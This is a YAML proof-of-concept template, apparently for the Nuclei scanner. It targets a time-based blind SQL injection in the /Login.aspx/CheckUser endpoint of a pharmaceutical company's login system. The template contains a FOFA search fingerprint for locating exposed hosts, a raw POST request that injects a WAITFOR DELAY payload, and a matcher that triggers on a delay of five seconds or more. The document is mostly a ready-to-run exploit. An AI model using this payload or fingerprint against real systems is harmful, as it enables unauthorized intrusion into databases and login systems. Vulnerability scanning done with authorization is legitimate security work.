id: poc-qx8cxdwp48qpzg4e
info:
  name: 某医药公司登录系统CheckUser 存在延时注入
  author: hacktwo
  severity: medium
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qx8cxdwp48qpzg4e

    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: other,2024
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: qx8cxdwp48qpzg4e
    fofa: body="ResourceScripts/zh-cn-Login.aspx.js"
http:
- raw:
  - 'POST /Login.aspx/CheckUser HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0

    Accept: */*

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    X-Requested-With: XMLHttpRequest

    Content-Type: application/json; charset=utf-8

    Priority: u=1


    {"value":"'' waitfor delay ''0:0:5''--+"}'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
